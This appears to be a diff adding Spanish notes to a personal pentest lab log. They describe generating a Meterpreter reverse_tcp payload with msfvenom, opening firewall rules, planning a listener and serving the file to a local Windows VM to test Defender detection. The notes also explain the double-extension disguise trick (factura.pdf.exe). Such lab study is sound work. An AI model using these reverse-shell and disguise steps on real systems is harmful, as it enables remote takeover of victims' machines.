@@ -96,3 +96,40 @@ FASE 3 - TAREA 3.1 (2026-10-21)
 (aqui anotas IPs, puertos abiertos, que detecto Defender, resultados)
 
 ===============================================================================
+
+RETOMA (2026-10-27, manana):
+  - Cambio de red: hoy trabajo por WIFI (wlp9s0), no por cable (enp8s0).
+  - VM Windows: adaptador Bridged cambiado de enp8s0 -> wlp9s0 en VirtualBox.
+  - Consecuencias a revisar: IP nueva del host (LHOST del payload), IP de la VM
+    (DHCP), y reglas nft (usar wlp9s0 / IP nueva de la VM).
+  TASK 1 (red wifi) - Firewall temporal:
+    P1 OK: host BlackArch = 172.20.10.8 (wlp9s0), VM Windows = 172.20.10.2
+      (MAC 08:00:27:EE:D0:DD VirtualBox). Red /28 = hotspot del celular
+      (gateway 172.20.10.1). nmap -sn 172.20.10.8/28.
+    P2 OK: la regla vieja (ip saddr 192.168.1.21 tcp dport 443) ya NO sirve:
+      filtra la IP vieja de la VM; ahora la VM es 172.20.10.2 -> nunca coincide.
+    P3 OK (con ayuda): sudo nft insert rule inet filter input iifname "wlp9s0"
+      ip saddr 172.20.10.2 tcp dport 443 accept
+      Verificada con nft -a list ruleset: 1a de chain input, handle 14 (antes del
+      reject handle 12). La regla vieja de 192.168.1.21 ya no aparece (se perdio
+      al reiniciar: confirma que insert = temporal, solo en memoria del kernel).
+    P4 PENDIENTE: regla igual para tcp dport 8000 (descarga).
+
+  TASK 2 - Regenerar payload (IP nueva):
+    P1 OK: LHOST 172.20.10.8, LPORT 443, formato exe; payload
+      windows/x64/meterpreter/reverse_tcp (completado por mi).
+    P2 casi: msfvenom ... LHOST=172.20.10.8 LPORT=443 -o fish.exe -> FALTA -f exe
+      (sin -f sale raw/shellcode, no es un PE valido). Nuevo nombre: fish.exe.
+    Nota defensiva (pregunta del .pdf): renombrar a .pdf no ejecuta nada (Windows
+      abre por extension). Truco real = doble extension (factura.pdf.exe) + icono
+      falso, aprovecha que Windows oculta extensiones. Defensa: mostrar extensiones;
+      Defender detecta por contenido/firma, no por nombre. Idea futura: prueba
+      doble extension vs Defender.
+
+PAUSA (2026-10-27, ~7am) -> RETOMAR EN:
+  1. Task 2 P2: ejecutar msfvenom con -f exe -> fish.exe (pegar salida/tamano).
+  2. Task 1 P4: sudo nft insert ... iifname "wlp9s0" ip saddr 172.20.10.2 tcp dport 8000 accept
+  3. Listener msfconsole con LHOST 172.20.10.8 LPORT 443.
+  4. Transferencia (http.server 8000) con Defender ENCENDIDO: detecta? cuando
+     (descarga/ejecucion)? cuanto tarda? nombre de amenaza?
+  Reglas temporales activas: handle 14 (443). Recordar limpiar en Fase 4.
